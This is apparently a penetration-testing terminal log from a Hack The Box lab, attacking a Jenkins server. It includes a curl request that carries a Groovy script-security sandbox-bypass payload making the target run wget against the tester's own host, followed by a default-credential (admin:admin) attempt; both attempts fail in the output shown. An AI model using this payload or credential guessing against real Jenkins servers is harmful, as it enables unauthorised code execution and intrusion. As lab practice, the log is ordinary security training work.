https://github.com/gquere/pwn_jenkins

```bash
┌──(kali㉿gobots)-[26Apr2024 22:08:47]-[~/SUT/Genesis_proLab_htB/vpn]                                                                                                                                       
└─$ curl -k -4 -X POST "http://10.10.110.102:8080/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){"wget 
10.10.14.39/bla.txt".execute()}}'                                                                                                                                                                           
                                                                                                                                                                                                            
<html>                                                                                                                                                                                                      
<head>                                                                                                                                                                                                      
<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>                                                                                                                                         
<title>Error 403 No valid crumb was included in the request</title>                                                                                                                                         
</head>                                                                                                                                                                                                     
<body><h2>HTTP ERROR 403</h2>                                                                                                                                                                               
<p>Problem accessing /descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/. Reason:                                                                         
<pre>    No valid crumb was included in the request</pre></p><hr><a href="http://eclipse.org/jetty">Powered by Jetty:// 9.4.z-SNAPSHOT</a><hr/>                                                             
                                                                                                                                                                                                            
</body>                                                                                                                                                                                                     
</html>                                                                                                                                                                                                     
```



```
┌──(kali㉿gobots)-[26Apr2024 22:09:34]-[~/SUT/Genesis_proLab_htB/vpn]
└─$ curl -v -X GET http://10.10.110.102:8080/crumbIssuer/api/json --user <username>:<password>         
zsh: parse error near `\n'

┌──(kali㉿gobots)-[26Apr2024 22:10:41]-[~/SUT/Genesis_proLab_htB/vpn]
└─$ curl -v -X GET http://10.10.110.102:8080/crumbIssuer/api/json --user admin:admin                   
Note: Unnecessary use of -X or --request, GET is already inferred.
*   Trying 10.10.110.102:8080...
* Connected to 10.10.110.102 (10.10.110.102) port 8080
* Server auth using Basic with user 'admin'
> GET /crumbIssuer/api/json HTTP/1.1
> Host: 10.10.110.102:8080
> Authorization: Basic YWRtaW46YWRtaW4=
> User-Agent: curl/8.4.0
> Accept: */*
> 
< HTTP/1.1 401 Invalid password/token for user: admin
< Date: Fri, 26 Apr 2024 22:11:12 GMT
< X-Content-Type-Options: nosniff
* Authentication problem. Ignoring this.
< WWW-Authenticate: Basic realm="Jenkins"
< Cache-Control: must-revalidate,no-cache,no-store
< Content-Type: text/html;charset=iso-8859-1
< Content-Length: 393
< Server: Jetty(9.4.z-SNAPSHOT)
< 
<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8"/>
<title>Error 401 Invalid password/token for user: admin</title>
</head>
<body><h2>HTTP ERROR 401</h2>
<p>Problem accessing /crumbIssuer/api/json. Reason:
<pre>    Invalid password/token for user: admin</pre></p><hr><a href="http://eclipse.org/jetty">Powered by Jetty:// 9.4.z-SNAPSHOT</a><hr/>

</body>
</html>
* Connection #0 to host 10.10.110.102 left intact

```